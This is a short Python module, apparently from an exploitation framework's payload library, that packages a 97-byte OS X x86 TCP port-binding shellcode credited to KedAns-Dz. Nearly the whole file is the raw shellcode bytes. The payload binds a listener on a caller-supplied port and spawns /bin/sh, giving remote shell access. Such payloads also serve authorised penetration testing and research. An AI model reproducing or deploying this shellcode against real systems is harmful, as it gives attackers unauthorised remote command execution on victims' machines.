from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "KedAns-Dz"
    Shellcode.info["name"] = "OSX86 - tcp_bind shellcode"
    Shellcode.info["references"] = [
        "https://packetstormsecurity.com/files/109627/OS-X-x86-Port-Binding-Shellcode.html",
    ]
    Shellcode.info["size"] = 97

    def __init__(self, **kwargs): 
        Shellcode.info["payload"] = [
            r"\x31\xC0\x50\x50\x50\xB0\x7E\xCD\x80"    
            r"\x31\xC0\x50\x50\xB0\x17\xCD\x80\x31\xC0"     
            r"\x50\x68\xFF\x02"
            + kwargs["lport"] +
            r"\x89\xE7\x50\x6A\x01\x6A\x02\x6A\x10"     
            r"\xB0\x61\xCD\x80\x57\x50\x50\x6A\x68"     
            r"\x58\xCD\x80\x89\x47\xEC\xB0\x6A\xCD\x80"     
            r"\xB0\x1E\xCD\x80\x50\x50\x6A\x5A\x58"        
            r"\xCD\x80\xFF\x4F\xE4\x79\xF6\x50"       
            r"\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E" 
            r"\x89\xE3\x50\x54\x54\x53\x50\xB0\x3B"     
            r"\xCD\x80"

        ]
